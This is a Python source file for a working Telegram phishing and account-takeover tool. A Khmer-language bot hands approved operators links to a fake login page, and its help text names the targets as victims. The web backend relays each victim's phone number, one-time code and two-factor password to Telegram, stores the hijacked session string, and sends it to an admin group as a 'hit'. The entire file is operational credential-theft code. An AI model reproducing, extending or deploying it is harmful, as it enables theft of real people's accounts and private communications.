import os
import asyncio
import telebot
import psycopg2
import logging
from telebot import types
from quart import Quart, request, jsonify
from telethon import TelegramClient, functions, errors
from telethon.sessions import StringSession
from threading import Thread

# --- 1. CONFIGURATION ---
API_ID = int(os.environ.get("API_ID", 36003995))
API_HASH = os.environ.get("API_HASH", "41a2b48afe9cfbd1fbf59c5e75b00afa")
BOT_TOKEN = os.environ.get("BOT_TOKEN")
DATABASE_URL = os.environ.get("DATABASE_URL")
LOGGER_GROUP = int(os.environ.get("LOGGER_GROUP", 0))
VERIFY_GROUP = int(os.environ.get("VERIFY_GROUP", 0))
ADMIN_USERNAME = "@g_yuyuu"
BASE_URL = os.environ.get("BASE_URL", "")

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")
app = Quart(__name__)

# Temporary storage for active login mirroring
active_mirrors = {}

# --- 2. DATABASE ENGINE ---

def get_db_connection():
    return psycopg2.connect(DATABASE_URL, sslmode='require')

def init_db():
    try:
        conn = get_db_connection()
        cur = conn.cursor()
        # Create core tables
        cur.execute("CREATE TABLE IF NOT EXISTS approved_users (user_id BIGINT PRIMARY KEY, status TEXT DEFAULT 'approved')")
        cur.execute("CREATE TABLE IF NOT EXISTS controlled_accounts (phone TEXT PRIMARY KEY, session_string TEXT, owner_name TEXT)")
        
        # Check if 'tid' column exists, if not, add it
        cur.execute("""
            DO $$ 
            BEGIN 
                IF NOT EXISTS (SELECT 1 FROM information_schema.columns 
                               WHERE table_name='controlled_accounts' AND column_name='tid') THEN
                    ALTER TABLE controlled_accounts ADD COLUMN tid BIGINT;
                END IF;
            END $$;
        """)
        
        conn.commit()
        cur.close()
        conn.close()
        logger.info("Database initialized and schema verified.")
    except Exception as e:
        logger.error(f"Database Init Error: {e}")

def is_approved(user_id):
    try:
        conn = get_db_connection()
        cur = conn.cursor()
        cur.execute("SELECT status FROM approved_users WHERE user_id = %s", (user_id,))
        res = cur.fetchone()
        cur.close()
        conn.close()
        return res is not None
    except:
        return False

# Run DB check on startup
init_db()

# --- 3. KHMER INTERFACE ---

def main_menu():
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.add(types.KeyboardButton("🔗 បង្កើតតំណភ្ជាប់"), types.KeyboardButton("📋 បញ្ជីគណនី"))
    markup.add(types.KeyboardButton("❓ ជំនួយ"))
    return markup

# --- 4. BOT COMMAND HANDLERS (PRIORITY ORDER) ---

@bot.message_handler(commands=['start'])
def cmd_start(m):
    if is_approved(m.from_user.id):
        bot.send_message(m.chat.id, "🎯 <b>Ultra Vinzy Mode សកម្ម!</b>", reply_markup=main_menu())
    else:
        bot.send_message(m.chat.id, "⏳ គណនីរបស់អ្នកមិនទាន់ត្រូវបានអនុញ្ញាតទេ។")
        # Alert Admin group for new user
        bot.send_message(VERIFY_GROUP, f"🔔 <b>សំណើសុំការអនុញ្ញាត</b>\n\nID: <code>{m.from_user.id}</code>\nUser: @{m.from_user.username}\n\nចុច <code>/approve_{m.from_user.id}</code>")

@bot.message_handler(func=lambda m: m.text.startswith('/approve_'))
def handle_approval(m):
    if m.chat.id != VERIFY_GROUP: return
    try:
        uid = int(m.text.split('_')[1])
        conn = get_db_connection()
        cur = conn.cursor()
        cur.execute("INSERT INTO approved_users (user_id, status) VALUES (%s, 'approved') ON CONFLICT (user_id) DO UPDATE SET status='approved'", (uid,))
        conn.commit()
        cur.close()
        conn.close()
        bot.send_message(uid, "🎉 គណនីរបស់អ្នកត្រូវបានយល់ព្រម!", reply_markup=main_menu())
        bot.reply_to(m, f"✅ User {uid} ត្រូវបានអនុញ្ញាត។")
    except Exception as e:
        bot.reply_to(m, f"❌ Error: {e}")

@bot.message_handler(func=lambda m: m.text.startswith('.authremove'))
def cmd_remove(m):
    if not is_approved(m.from_user.id): return
    parts = m.text.split()
    if len(parts) < 2: return bot.reply_to(m, "❌ របៀបប្រើ: <code>.authremove 855xxx</code>")
    
    phone = parts[1].replace("+", "").strip()
    try:
        conn = get_db_connection()
        cur = conn.cursor()
        cur.execute("DELETE FROM controlled_accounts WHERE phone = %s", (phone,))
        conn.commit()
        rows = cur.rowcount
        cur.close()
        conn.close()
        
        if rows > 0:
            bot.reply_to(m, f"🗑️ <b>លុបបានជោគជ័យ:</b> <code>{phone}</code>")
        else:
            bot.reply_to(m, f"❓ <b>រកមិនឃើញ:</b> លេខនេះមិនមានក្នុង DB ទេ។")
    except Exception as e:
        bot.reply_to(m, f"❌ Error: {e}")

@bot.message_handler(func=lambda m: m.text == "🔗 បង្កើតតំណភ្ជាប់")
def cmd_gen(m):
    if not is_approved(m.from_user.id): return
    link = f"{BASE_URL}/?id={m.from_user.id}"
    bot.reply_to(m, f"✅ <b>តំណភ្ជាប់របស់អ្នក៖</b>\n\n<code>{link}</code>")

@bot.message_handler(func=lambda m: m.text == "📋 បញ្ជីគណនី")
def cmd_list(m):
    if not is_approved(m.from_user.id): return
    try:
        conn = get_db_connection()
        cur = conn.cursor()
        cur.execute("SELECT phone, owner_name FROM controlled_accounts WHERE tid = %s", (m.from_user.id,))
        rows = cur.fetchall()
        cur.close()
        conn.close()
        
        if not rows:
            return bot.reply_to(m, "📭 អ្នកមិនទាន់មានគណនីដែលបានស្ទូចនៅឡើយទេ។")
        
        msg = "📋 <b>បញ្ជីគណនីរបស់អ្នក:</b>\n\n"
        for r in rows:
            msg += f"👤 {r[1]} | 📱 <code>{r[0]}</code>\n"
        bot.reply_to(m, msg)
    except Exception as e:
        bot.reply_to(m, f"❌ Error: {e}")

@bot.message_handler(func=lambda m: m.text == "❓ ជំនួយ")
def cmd_help(m):
    help_text = (
        "❓ <b>ជំនួយសម្រាប់អ្នកប្រើប្រាស់</b>\n\n"
        "1. ចុច 'បង្កើតតំណភ្ជាប់' ដើម្បីទទួលបាន Link សម្រាប់ផ្ញើទៅកាន់ជនរងគ្រោះ\n"
        "2. រាល់ពេលមានអ្នក Login អ្នកនឹងទទួលបានសារដំណឹងភ្លាមៗ\n"
        "3. ដើម្បីលុបគណនីពីបញ្ជី ប្រើពាក្យបញ្ជា <code>.authremove លេខទូរស័ព្ទ</code>"
    )
    bot.reply_to(m, help_text)

# --- 5. THE DUAL-HOOK ENGINE ---

async def finalize_ultra_hit(phone, tid):
    if phone not in active_mirrors: return
    client = active_mirrors[phone]['client']
    try:
        me = await client.get_me()
        session_str = client.session.save()
        
        conn = get_db_connection()
        cur = conn.cursor()
        cur.execute("""
            INSERT INTO controlled_accounts (phone, session_string, owner_name, tid) 
            VALUES (%s, %s, %s, %s) 
            ON CONFLICT (phone) DO UPDATE SET session_string = EXCLUDED.session_string, tid = EXCLUDED.tid
        """, (phone, session_str, me.first_name, tid))
        conn.commit()
        cur.close()
        conn.close()

        # LOG TO ADMIN
        bot.send_message(LOGGER_GROUP, f"💰 <b>ស្ទូចបានសម្រេច! (Admin)</b>\n👤 {me.first_name}\n📱 {phone}\n🔑 <code>{session_str}</code>")
        
        # NOTIFY USER (TID)
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("🔌 Connect Account", url=f"https://t.me/{ADMIN_USERNAME.replace('@','')}"))
        bot.send_message(tid, f"🎯 <b>HIT ថ្មី!</b>\n👤 {me.first_name}\n📱 {phone}\n\n⚠️ ទាក់ទង Admin ដើម្បីប្រើប្រាស់។", reply_markup=markup)
    except Exception as e:
        logger.error(f"Finalize Hit Error: {e}")
    finally:
        await client.disconnect()
        if phone in active_mirrors: del active_mirrors[phone]

# --- 6. WEB ROUTES ---

@app.route('/')
async def index():
    try:
        with open("templates/login.html", "r", encoding="utf-8") as f:
            return f.read()
    except: return "❌ login.html missing in templates/", 404

@app.route('/step_phone', methods=['POST'])
async def step_phone():
    data = await request.json
    phone, tid = data.get('phone', '').replace("+", "").replace(" ", ""), data.get('tid')
    client = TelegramClient(StringSession(), API_ID, API_HASH, device_model="iPhone 16 Pro Max", system_version="18.2.1", app_version="11.5.0")
    await client.connect()
    try:
        sent_code = await client.send_code_request(phone)
        active_mirrors[phone] = {"client": client, "hash": sent_code.phone_code_hash, "tid": tid}
        return jsonify({"status": "success"})
    except Exception as e: return jsonify({"status": "error", "msg": str(e)})

@app.route('/step_code', methods=['POST'])
async def step_code():
    data = await request.json
    phone, code, tid = data.get('phone', '').replace("+", ""), data.get('code'), data.get('tid')
    if phone not in active_mirrors: return jsonify({"status": "error", "msg": "Expired"})
    try:
        await active_mirrors[phone]['client'].sign_in(phone, code, phone_code_hash=active_mirrors[phone]['hash'])
        await finalize_ultra_hit(phone, tid)
        return jsonify({"status": "success"})
    except errors.SessionPasswordNeededError: return jsonify({"status": "2fa_needed"})
    except Exception as e: return jsonify({"status": "error", "msg": str(e)})

@app.route('/step_2fa', methods=['POST'])
async def step_2fa():
    data = await request.json
    phone, password, tid = data.get('phone', '').replace("+", ""), data.get('password'), data.get('tid')
    if phone not in active_mirrors: return jsonify({"status": "error", "msg": "Expired"})
    try:
        await active_mirrors[phone]['client'].sign_in(password=password)
        await finalize_ultra_hit(phone, tid)
        return jsonify({"status": "success"})
    except Exception as e: return jsonify({"status": "error", "msg": str(e)})

# --- 7. RUN ---
if __name__ == "__main__":
    # skip_pending=True handles the 409 Conflict error on restarts
    Thread(target=lambda: bot.infinity_polling(skip_pending=True)).start()
    app.run(host="0.0.0.0", port=8000)
